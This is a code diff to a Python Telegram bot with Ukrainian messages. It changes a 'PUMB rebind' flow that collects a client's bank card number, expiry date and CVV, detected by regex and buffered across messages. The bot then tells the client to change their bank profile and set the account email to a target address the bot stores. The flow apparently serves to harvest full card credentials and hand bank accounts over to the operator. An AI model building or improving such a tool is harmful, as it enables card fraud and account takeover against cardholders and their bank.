@@ -23,6 +23,7 @@ router = Router()
 _client_reply_cooldowns = {}
 _pumb_new_photo_tasks: dict[int, asyncio.Task] = {}
 _pumb_rebind_photo_tasks: dict[int, asyncio.Task] = {}
+_pumb_card_tasks: dict[int, asyncio.Task] = {}
 _pumb_photo_locks: dict[int, asyncio.Lock] = {}
 
 PUMB_EXAMPLE_PHOTOS_DIR = r"C:\Users\oliks\Documents\PUMB"
@@ -2055,22 +2056,78 @@ async def _delayed_pumb_rebind_process(client_id: int, chat_id: int, state: FSMC
             )
 
 
+async def _delayed_pumb_card_details_process(client_id: int, state: FSMContext, bot: Bot):
+    try:
+        await asyncio.sleep(2.5)
+        if await state.get_state() != RegistrationStates.pumb_rebind_card_details:
+            return
+
+        data = await state.get_data()
+        card_lines = data.get("pumb_card_details_lines", [])
+        if not card_lines:
+            return
+
+        combined_text = "\n".join(card_lines)
+        await state.update_data(pumb_card_details_text=combined_text)
+
+        target_email = await db.get_pumb_target_email()
+        await state.set_state(RegistrationStates.pumb_rebind_anketa_screenshot)
+        await bot.send_message(
+            chat_id=client_id,
+            text=(
+                f"Змініть анкетні дані та пошту\n\n"
+                f"• Вкажіть пошту: {target_email}"
+            )
+        )
+    except asyncio.CancelledError:
+        return
+    except Exception as e:
+        logger.error(f"Помилка затримки збору реквізитів картки ПУМБ: {e}")
+
+
 @router.message(RegistrationStates.pumb_rebind_card_details, F.chat.type == "private")
 async def process_pumb_rebind_card_details(message: Message, state: FSMContext, bot: Bot):
-    """Прийом реквізитів картки ПУМБ від клієнта (текстом)."""
-    text = message.text or ""
+    """Прийом реквізитів картки ПУМБ від клієнта (одним або кількома повідомленнями)."""
+    text = (message.text or "").strip()
     if not text:
         await message.answer("Будь ласка, надішліть реквізити картки текстом.")
         return
 
-    await state.update_data(pumb_card_details_text=text)
+    client_id = message.from_user.id
+    data = await state.get_data()
+    card_lines = data.get("pumb_card_details_lines", [])
+    card_lines.append(text)
+    await state.update_data(pumb_card_details_lines=card_lines)
 
-    target_email = await db.get_pumb_target_email()
-    await state.set_state(RegistrationStates.pumb_rebind_anketa_screenshot)
-    await message.answer(
-        f"Змініть анкетні дані та пошту\n\n"
-        f"• Вкажіть пошту: {target_email}"
+    combined = "\n".join(card_lines)
+    has_card_num = bool(re.search(r'\d{13,19}', combined))
+    has_expiry = bool(re.search(r'\d{2}[/.\-]\d{2}', combined))
+    has_cvv = bool(re.search(r'\b\d{3}\b', combined))
+
+    # Якщо вже є всі 3 реквізити (номер, термін, CVV), обробляємо миттєво
+    if has_card_num and has_expiry and has_cvv:
+        existing = _pumb_card_tasks.pop(client_id, None)
+        if existing and not existing.done():
+            existing.cancel()
+
+        await state.update_data(pumb_card_details_text=combined)
+        target_email = await db.get_pumb_target_email()
+        await state.set_state(RegistrationStates.pumb_rebind_anketa_screenshot)
+        await message.answer(
+            f"Змініть анкетні дані та пошту\n\n"
+            f"• Вкажіть пошту: {target_email}"
+        )
+        return
+
+    # Інакше чекаємо 2.5 секунди на випадок, якщо клієнт надсилає термін дії та CVV окремими повідомленнями
+    existing = _pumb_card_tasks.pop(client_id, None)
+    if existing and not existing.done():
+        existing.cancel()
+
+    task = asyncio.create_task(
+        _delayed_pumb_card_details_process(client_id, state, bot)
     )
+    _pumb_card_tasks[client_id] = task
 
 
 @router.message(RegistrationStates.pumb_rebind_anketa_screenshot, F.chat.type == "private")
